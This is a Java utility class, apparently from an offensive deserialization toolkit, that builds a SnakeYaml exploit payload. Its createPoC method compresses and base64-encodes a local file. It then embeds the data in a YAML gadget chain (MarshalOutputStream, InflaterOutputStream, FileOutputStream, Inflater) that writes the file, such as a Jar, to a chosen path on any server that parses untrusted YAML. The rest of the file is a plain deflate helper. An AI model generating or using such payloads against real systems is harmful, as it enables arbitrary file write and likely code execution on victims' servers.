package com.h2tg.ysogate.utils;

import java.io.*;
import java.util.zip.Deflater;

import static com.h2tg.ysogate.utils.Utils.base64Encode;


/**
 * SnakeYaml 写入 Jar 包 poc 生成工具类
 *
 * @author su18
 */
public class SnakeYamlUtils {

    public static String createPoC(String srcPath, String destPath) throws Exception {

        File   file        = new File(srcPath);
        long   FileLength  = file.length();
        byte[] FileContent = new byte[(int) FileLength];
        try {
            FileInputStream in = new FileInputStream(file);
            in.read(FileContent);
            in.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        byte[] compressBytes = compress(FileContent);
        return "!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [\"" + destPath + "\"],false],!!java.util.zip.Inflater  { input: !!binary " + base64Encode(compressBytes) + " },1048576]]";
    }

    public static byte[] compress(byte[] data) {
        byte[] output = new byte[0];

        Deflater compresser = new Deflater();

        compresser.reset();
        compresser.setInput(data);
        compresser.finish();
        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);
        try {
            byte[] buf = new byte[1024];
            while (!compresser.finished()) {
                int i = compresser.deflate(buf);
                bos.write(buf, 0, i);
            }
            output = bos.toByteArray();
        } catch (Exception e) {
            output = data;
            e.printStackTrace();
        } finally {
            try {
                bos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        compresser.end();
        return output;
    }

}
